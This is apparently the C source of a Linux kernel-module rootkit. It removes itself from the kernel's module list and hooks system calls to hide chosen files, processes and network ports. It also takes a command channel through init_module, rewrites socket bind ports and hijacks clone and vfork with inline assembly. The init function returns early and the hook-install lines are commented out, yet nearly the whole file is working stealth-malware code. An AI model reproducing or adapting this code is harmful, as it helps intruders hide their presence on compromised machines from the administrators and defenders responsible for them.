#include "Rtonline.h"
#include "Rtwrite.h"
#include "Rtsyscall.h"
#include "Rtcmd.h"
#include "Rtstring.h"
#include "Rtpath.h"
#include "Rtlist.h"

unsigned int rtpid = -1;
unsigned int rtfd = -1;

struct list_head * module_list_head = NULL;
long clone_pid = 0;
long clone_flag = 0;
long clone_count = 0;
long clone_tid = 0;
long clone_lasttid = 0;

long vfork_pid = 0;
long vfork_flag = 0;
long vfork_count = 0;
long vfork_spid = 0;
long vfork_lastpid = 0;
long process_count = 0;




typedef struct {
    int pid;
    int count;
    long lastcall;

} PROC_RECORD;
PROC_RECORD pred[10];

void
del_lkm(const char *name) {
    struct module * pmod;
    struct list_head *plist;
    //struct list_head *plisthead;

    if (module_list_head == NULL) {
        module_list_head = &__this_module.list;
    }

    plist = module_list_head;

    while (plist) {
        pmod = list_entry(plist, struct module, list);
        if (!strcmp(name, pmod->name)) {
            if (module_list_head == plist) {
                module_list_head = module_list_head->prev;
            }

            plist->next->prev = plist->prev;
            plist->prev->next = plist->next;

            break;
        }

        plist = plist->prev;

        if (plist == module_list_head) {
            break;
        }
    }
}

// int init_module(const char *name, struct module *image);

RT_SYSCALL_DEFINE(long, init_module, void __user *umod, unsigned long len,
        const char __user *uargs) {
    long ret;

    rtprint("enter init_module");
    if (0 == strcmp(uargs, "rootkit")) {
        PCMD pCmd = (PCMD) umod;
        rtprint("plkmsg");
        ret = lkm_mesg_proc(pCmd);
        return ret;
    }

    ret = RT_SYSCALL_CALL(init_module, umod, len, uargs);

    return ret;
}

// sys_getdents

RT_SYSCALL_DEFINE(long, getdents, unsigned int fd,
        struct linux_dirent __user* dirp, unsigned int count) {
    long ret;
    long buflen = 0;
    struct linux_dirent * pcur = NULL;

    ret = RT_SYSCALL_CALL(getdents, fd, dirp, count);
    //rtprint("call rt.getdents");

    if (!ret) {
        goto out;
    }

    buflen = ret;
    pcur = (struct linux_dirent *) dirp;

    while (buflen > 0) {
        int len = 0;
        len = pcur->d_reclen;
        buflen -= len;

        if (0 == check_procs(atoi(pcur->d_name))) {
            //rtprint("hide process [%s]@[getdents]", pcur->d_name);
            ret -= len;
            memmove(pcur, (char *) pcur + pcur->d_reclen, buflen);
        } else {
            pcur = (struct linux_dirent *) ((char*) pcur + len);
        }
    }

out:
    return ret;
}

// sys_getdents64

RT_SYSCALL_DEFINE(long, getdents64, unsigned int fd,
        struct linux_dirent64 __user* dirp, unsigned int count) {
    long ret = 0;
    long buflen = 0;

    char *pwd;
    char *fullname;
    struct linux_dirent64 * pcur = NULL;

    ret = RT_SYSCALL_CALL(getdents64, fd, dirp, count);
    //rtprint("call rt.getdents64");

    pwd = (char *) kmalloc(MAX_PATH, GFP_KERNEL);
    fullname = (char *) kmalloc(MAX_PATH, GFP_KERNEL);

    if (!pwd || !fullname) {
        goto out;
    }

    get_path(pwd, sizeof (pwd), fd);

    //rtprint("pwd = %s", pwd);

    buflen = ret;
    pcur = (struct linux_dirent64 *) dirp;
    while (buflen > 0) {
        int len = 0;
        len = pcur->d_reclen;
        buflen -= len;

        strcpy(fullname, pwd);
        strcat(fullname, pcur->d_name);
        if (0 == check_files(fullname)) {
            //rtprint("hide file [%s]@[getdents64]", fullname);
            ret -= len;
            memmove(pcur, (char *) pcur + pcur->d_reclen, buflen);
        } else {
            pcur = (struct linux_dirent64 *) ((char*) pcur + len);
        }
    }

out:
    AvoidNull(kfree, pwd);
    AvoidNull(kfree, fullname);

    return ret;
}

RT_SYSCALL_DEFINE(long, chdir, const char __user *filename) {
    long ret = -1;

    char *pwd = NULL;
    char *name = NULL;

    rtprint("chdir dirname[%s]", filename);
    if (0 == check_files((char *) filename)) {
        rtprint("hide file [%s]@[chdir]", filename);
        goto out;
    }

    pwd = (char *) kmalloc(MAX_PATH, GFP_KERNEL);
    name = (char *) kmalloc(MAX_PATH, GFP_KERNEL);

    if (!pwd || !name) {
        goto out;
    }

    get_fullpath(pwd, sizeof (pwd), current->fs->pwd.dentry);
    strcpy(name, pwd);
    strcat(name, filename);

    if (0 == check_files(name)) {
        rtprint("hide file [%s]@[chdir]", name);
        goto out;
    }

    ret = RT_SYSCALL_CALL(chdir, filename);
out:
    AvoidNull(kfree, pwd);
    AvoidNull(kfree, name);

    return ret;
}

// sys_read

RT_SYSCALL_DEFINE(long, read, unsigned int fd,
        char __user *buf, size_t count) {
    int max = 0;
    long ret = 0;

    ret = RT_SYSCALL_CALL(read, fd, buf, count);
    //rtprint("read fd-[%d]", fd);

    if (ret <= 0) {
        goto out;
    }

    if (rtpid == current->pid && rtfd == fd) {
        int i;
        int len;
        char *p;

        if (ret % TCP_SZ == 0 || ret % UDP_SZ == 0) {
            max = TCP_SZ;
        } else {
            goto out;
        }

        for (i = 0; i < 2; i++, max = UDP_SZ) {
            for (p = buf + max; p < buf + ret; p += max) {
                int i = -1;
                int src = -1;
                int srcp = -1;

                sscanf(p, "%4d: %08X:%04X ", &i, &src, &srcp);

                if (0 == check_ports(srcp)) {
                    len = ret - (p - buf) - max;
                    memmove(p, p + max, len);
                    ret -= max;

                    rtprint("hide port [%d]@[read]", srcp);
                }
            }
        }
    }
out:
    return ret;
}

/**
 * sys_open
 * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
 */
RT_SYSCALL_DEFINE(long, open, const char __user *filename,
        int flags, int mode) {
    long ret = 0;

    rtprint("call open[%s]", filename);

    if (0 == check_files((char *) filename)) {
        return -2;
    }

    ret = RT_SYSCALL_CALL(open, filename, flags, mode);

    if (0 == strcmp(filename, "/proc/net/tcp")
            || 0 == strcmp(filename, "/proc/net/udp")) {
        rtprint("call open,filename[%s]", filename);
        rtpid = current->pid;
        rtprint("call open,rtpid[%d]", rtpid);
        rtfd = ret;
        rtprint("call open,rtfd[%d]", rtfd);
    }

    return ret;
}

/**
 * sys_getpgid - 20号
 * 取得目前 process 的 thread ID (process ID)
 * 
 */
RT_SYSCALL_DEFINE(long, getpgid, pid_t pid) {
    long ret = 0;
    rtprint("call getpgid");

    //ESRCH - No such process
    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        goto out;
    }

    ret = RT_SYSCALL_CALL(getpgid, pid);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, getsid, pid_t pid) {
    long ret = 0;
    rtprint("call getsid");


    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        goto out;
    }

    ret = RT_SYSCALL_CALL(getsid, pid);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_getscheduler, pid_t pid) {

    long ret = 0;
    rtprint("call sched_getscheduler");

    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        goto out;
    }

    ret = RT_SYSCALL_CALL(sched_getscheduler, pid);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_getparam, pid_t pid,
        struct sched_param __user *param) {

    long ret = 0;
    rtprint("call sched_getparam");

    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        goto out;
    }

    ret = RT_SYSCALL_CALL(sched_getparam, pid, param);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_getaffinity, pid_t pid, unsigned int len,
        unsigned long __user *user_mask_ptr) {

    long ret = 0;
    rtprint("call sched_getaffinity");

    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        goto out;
    }

    ret = RT_SYSCALL_CALL(sched_getaffinity, pid, len, user_mask_ptr);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, sched_rr_get_interval, pid_t pid,
        struct timespec __user *interval) {

    long ret = 0;
    rtprint("call sched_rr_get_interval");

    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        goto out;
    }

    ret = RT_SYSCALL_CALL(sched_rr_get_interval, pid, interval);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, sysinfo, struct sysinfo __user *info) {

    long ret = 0;
    rtprint("call sysinfo");

    ret = RT_SYSCALL_CALL(sysinfo, info);

    info->procs -= proc_items();

    return ret;
}


#if BITS_PER_LONG == 32

RT_SYSCALL_DEFINE(long, stat64, char __user *filename,
        struct stat64 __user *statbuf) {
    long ret;

    //rtprint("call<stat64>");

    if (0 == check_files(filename)) {
        ret = -ENOENT;
        rtprint("stat64.filename = %s", filename);
        goto out;
    }

    ret = RT_SYSCALL_CALL(stat64, filename, statbuf);
out:
    return ret;
}

RT_SYSCALL_DEFINE(long, fstat64, unsigned long fd, struct stat64 __user *statbuf) {
    long ret;

    rtprint("call<fstat64>");

    ret = RT_SYSCALL_CALL(fstat64, fd, statbuf);

    return ret;
}

RT_SYSCALL_DEFINE(long, lstat64, char __user *filename,
        struct stat64 __user *statbuf) {
    long ret;

    //rtprint("call<lstat64>");

    if (0 == check_files(filename)) {
        ret = -ENOENT;
        rtprint("lstat64.filename = %s", filename);
        goto out;
    }

    ret = RT_SYSCALL_CALL(lstat64, filename, statbuf);
out:
    return ret;
}

#endif

RT_SYSCALL_DEFINE(long, socketcall, int call, unsigned long __user * args) {

    long ret;
    rtprint("call socketcall");

    switch (call) {
        case SYS_BIND:
        {
            long port;
            struct sockaddr_in *p;

            p = (struct sockaddr_in *) args[1];
            if (p && 0 == check_ports(ntohs(p->sin_port))) {
                port = p->sin_port;
                p->sin_port = htons(8998);
                ret = RT_SYSCALL_CALL(socketcall, call, args);
                p->sin_port = port;

                return ret;
            }
        }
            break;
        default:
            break;
    }

    ret = RT_SYSCALL_CALL(socketcall, call, args);


    return ret;
}

RT_SYSCALL_DEFINE_JMP(long, vfork, struct pt_regs *regs) {
    asm("sub    $0xc,%esp");
    asm("nopl   0x0(%eax,%eax,1)");
    asm("mov    0x3c(%eax),%edx");
    asm("mov    %eax,%ecx");
    asm("mov    $0x4111,%eax");
    asm("movl   $0x0,0x8(%esp)");
    asm("movl   $0x0,0x4(%esp)");
    asm("movl   $0x0,(%esp)");
    asm("push   %eax");
    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
    asm("movl   %eax,%esi");
    asm("pop    %eax");
    asm("call   *%esi");

    asm("push %eax");
    asm("push %ebx");
    asm("push %ecx");
    asm("push %edx");

    asm volatile("movl %%eax,%0" : "=m"(vfork_spid) :);

    if (vfork_flag == 0) {
        vfork_pid = current->pid;
        vfork_flag = 1;
    } else {
        if (vfork_pid == current->pid) {
            vfork_flag++;
        } else {
            vfork_flag--;
        }
    }

    if (vfork_flag >= 100 && vfork_pid == current->pid) {
        int pid;

        pid = get_hide_proc(vfork_lastpid++);

        if (pid) {
            vfork_spid = pid;
        }
    }

    asm("pop %edx");
    asm("pop %ecx");
    asm("pop %ebx");
    asm("pop %eax");

    asm volatile("movl %0,%%eax"::"m"(vfork_spid));

    asm("leave  ");
    asm("ret    ");

    return 0;
}

RT_SYSCALL_DEFINE(long, gettid, void) {
    long ret = 0;

    ret = RT_SYSCALL_CALL(gettid);

    if (ret == clone_tid) {
        int tid;

        tid = get_hide_proc(clone_lasttid++);

        if (tid) {
            ret = tid;
        }
    }

    return ret;
}

RT_SYSCALL_DEFINE_JMP(long, clone, unsigned long clone_flags, unsigned long newsp,
        void __user *parent_tid, void __user *child_tid, struct pt_regs *regs) {
    asm("sub    $0x14,%esp");
    asm("mov    %ebx,-0x8(%ebp)");
    asm("mov    %esi,-0x4(%ebp)");
    asm("nopl   0x0(%eax,%eax,1)");
    asm("mov    %eax,%ecx");
    asm("mov    (%eax),%eax");
    asm("mov    0x4(%ecx),%edx");
    asm("mov    0x8(%ecx),%ebx");
    asm("mov    0x10(%ecx),%esi");
    asm("test   %edx,%edx");
    asm("jne    next");
    asm("mov    0x3c(%ecx),%edx");
    asm("next:");
    asm("mov    %esi,0x8(%esp)");
    asm("mov    %ebx,0x4(%esp)");
    asm("movl   $0x0,(%esp)");
    asm("push   %eax");
    asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
    asm("movl   %eax,%esi");
    asm("pop    %eax");
    asm("call   *%esi");
    asm("mov    -0x8(%ebp),%ebx");
    asm("mov    -0x4(%ebp),%esi");

    asm("push %eax");
    asm("push %ebx");
    asm("push %ecx");
    asm("push %edx");

    asm volatile("movl %%eax,%0" : "=m"(clone_tid) :);

    if (clone_flag == 0) {
        clone_pid = current->pid;
        clone_flag = 1;
    } else {
        if (clone_pid == current->pid) {
            clone_flag++;
        } else {
            clone_flag--;
        }
    }

    if (clone_flag < 100 || clone_pid != current->pid) {
        clone_tid = 0;
    }

    asm("pop %edx");
    asm("pop %ecx");
    asm("pop %ebx");
    asm("pop %eax");

    asm("mov    %ebp,%esp");
    asm("pop    %ebp");
    asm("ret    ");

    return 0;
}

// sys_getpriority

RT_SYSCALL_DEFINE(long, getpriority, int which, int who) {
    long ret = -1;

    if (0 == check_procs(who)) {
        rtprint("hide process [%d]", who);
        goto out;
    }

    ret = RT_SYSCALL_CALL(getpriority, which, who);
out:
    return ret;
}

RT_SYSCALL_DEFINE(int, waitpid, pid_t pid, int __user *stat_addr, int options) {
    int ret;

    ret = RT_SYSCALL_CALL(waitpid, pid, stat_addr, options);

    return ret;
}

RT_SYSCALL_DEFINE(long, kill, int pid, int sig) {
    long ret = 0;

    if (0 == check_procs(pid)) {
        ret = -ESRCH;
        rtprint("kill.ret = %d", (unsigned int) ret);
        goto out;
    }

    ret = RT_SYSCALL_CALL(kill, pid, sig);
    rtprint("kill pid[%d]", pid);
out:
    return ret;
}

static int __init
ThisInit(void) {
    rtprint("Enter init function");

    sys_call_table = find_sys_call_table_method_one();
    sys_call_table = find_sys_call_table_method_two();

    return 0;

    rtprint("sys_call_table = find_sys_call_table() finished!");
    addr_do_fork = find_do_fork();
    rtprint("addr_do_fork = find_do_fork() finished!");

    write_begin();
    rtprint("disable_write_protection");

//    RT_SYSCALL_REPLACE_JMP(vfork); //190
//    RT_SYSCALL_REPLACE_JMP(clone); //120
//    RT_SYSCALL_REPLACE(init_module); //128
//    RT_SYSCALL_REPLACE(getdents); //141
//    RT_SYSCALL_REPLACE(getdents64); //220
//    RT_SYSCALL_REPLACE(chdir); //12
//    RT_SYSCALL_REPLACE(getpriority); //96
//    RT_SYSCALL_REPLACE(read); //3
//    RT_SYSCALL_REPLACE(open); //5
//    RT_SYSCALL_REPLACE(kill); //37
//    RT_SYSCALL_REPLACE(gettid); //224
//    RT_SYSCALL_REPLACE(getpgid); //132
//    RT_SYSCALL_REPLACE(getsid); //66
//    RT_SYSCALL_REPLACE(sched_getscheduler); //157
//    RT_SYSCALL_REPLACE(sched_getparam); //155
//    RT_SYSCALL_REPLACE(sched_getaffinity); //242
//    RT_SYSCALL_REPLACE(sched_rr_get_interval); //161
//    RT_SYSCALL_REPLACE(sysinfo); //116
//#if BITS_PER_LONG == 32
//    RT_SYSCALL_REPLACE(stat64); //195
//    RT_SYSCALL_REPLACE(lstat64); //196
//#endif
//    RT_SYSCALL_REPLACE(socketcall); //102

    write_end();
    rtprint("enable_write_protection");
    rtprint("Leave init function");

    return 0;
}

static void __exit
ThisExit(void) {
    rtprint("Enter exit function");
    return;
    write_begin();
    rtprint("disable_write_protection");

//    RT_SYSCALL_RESTORE_JMP(vfork);
//    RT_SYSCALL_RESTORE_JMP(clone);
//    RT_SYSCALL_RESTORE(init_module);
//    RT_SYSCALL_RESTORE(getdents);
//    RT_SYSCALL_RESTORE(getdents64);
//    RT_SYSCALL_RESTORE(chdir);
//    RT_SYSCALL_RESTORE(getpriority);
//    RT_SYSCALL_RESTORE(read);
//    RT_SYSCALL_RESTORE(open);
//    RT_SYSCALL_RESTORE(kill);
//    RT_SYSCALL_RESTORE(gettid);
//    RT_SYSCALL_RESTORE(getpgid);
//    RT_SYSCALL_RESTORE(getsid);
//    RT_SYSCALL_RESTORE(sched_getscheduler);
//    RT_SYSCALL_RESTORE(sched_getparam);
//    RT_SYSCALL_RESTORE(sched_getaffinity);
//    RT_SYSCALL_RESTORE(sched_rr_get_interval);
//    RT_SYSCALL_RESTORE(sysinfo);
//#if BITS_PER_LONG == 32
//    RT_SYSCALL_RESTORE(stat64);
//    RT_SYSCALL_RESTORE(lstat64);
//#endif
//    RT_SYSCALL_RESTORE(socketcall);

    write_end();
    rtprint("enable_write_protection");
    rtprint("Leave exit function");
}

MODULE_LICENSE("GPL");

module_init(ThisInit); //模块入口函数
module_exit(ThisExit); //模块出口函数


